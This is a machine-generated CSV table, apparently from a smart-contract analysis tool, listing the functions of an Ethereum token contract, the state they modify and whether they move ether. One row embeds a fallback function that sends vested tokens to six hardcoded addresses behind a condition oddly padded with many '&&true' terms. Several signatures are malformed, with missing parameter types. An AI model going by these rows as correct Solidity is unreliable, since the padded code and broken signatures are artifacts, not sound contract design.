Function Name,State Variables Modified,Can Transfer Ether
"isAuthorized(address,address,bytes)",,False
validate(),,False
"serviceFallback(address,uint256,bytes,uint256)",,False
"tokenFallback(address,uint256,bytes)",,False
balanceOf(address),,False
"allowance(address,address)",,False
"transfer(address,uint256)",,False
"transferFrom(address,address,uint256)",,False
"approve(address,uint256)",,False
"transfer(address,uint,bytes)",,False
"buyService(,uint256,bytes)",,False
transfer(),,False
"approve(address,uint256,uint256)",,False
"increaseAllowance(address,uint256)",,False
"decreaseAllowance(address,uint256)",,False
"decreaseAllowanceOrEmtpy(address,uint256)",,False
initialize(),"token, token",True
"function()external{require(token.transfer(0x808b0730252DAA3a12CadC72f42E46E92a5e1bC8,VESTED_AMOUNT)&&true&&true&&true&&true&&true&&token.transfer(0xdA01fAFaF5E49e9467f99f5969cab499a5759cC6,VESTED_AMOUNT)&&token.transfer(0xddab6c29090E6111A490527614Ceac583D02C8De,VESTED_AMOUNT)&&true&&true&&true&&true&&true&&true&&token.transfer(0x5E6C9EC32b088c9FA1Fc0FEFa38A9B4De4169316,VESTED_AMOUNT)&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&token.transfer(0xFFB5d7C71e8680D0e9482e107F019a2b25D225B5,VESTED_AMOUNT)&&true&&true&&token.transfer(0x91cE537b1a8118Aa20Ef7F3093697a7437a5Dc4B,VESTED_AMOUNT)&&true&&true&&true&&true&&true&&true&&block.timestamp>=RELEASE_EPOCH&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true&&true);}()","token, VESTED_AMOUNT, token, VESTED_AMOUNT, token, VESTED_AMOUNT, token, VESTED_AMOUNT, token, VESTED_AMOUNT, token, VESTED_AMOUNT, RELEASE_EPOCH",True
changeFsTKAuthority(),fstkAuthority,False
balanceOf(address),accounts,False
"allowance(address,address)",accounts,False
"transfer(address,uint256)","accounts, accounts",True
"transferFrom(address,address,uint256)","accounts, accounts",True
"approve(address,uint256)","accounts, erc20ApproveChecking",True
"transfer(address,uint256,bytes)","accounts, accounts",True
"buyService(,uint256,bytes)",accounts,True
transfer(),"accounts, accounts",True
"subscriptionOf(address,address)",accounts,False
"subscribe(address,uint256,uint256,uint256)",accounts,True
cancelSubscription(address),accounts,True
collect(address),"accounts, accounts",True
collect(),"accounts, accounts",True
"approve(address,uint256,uint256)",accounts,True
"increaseAllowance(address,uint256)",accounts,True
"decreaseAllowance(address,uint256)",accounts,True
"decreaseAllowanceOrEmtpy(address,uint256)",accounts,True
setLiquid(bool),isLiquid,False
setERC20ApproveChecking(bool),erc20ApproveChecking,False
"FunderSmartToken(,address,)","accounts, totalSupply, accounts",False
setLiquid(bool),,False
setERC20ApproveChecking(bool),,False
"transferToken(,address,uint256)",,True
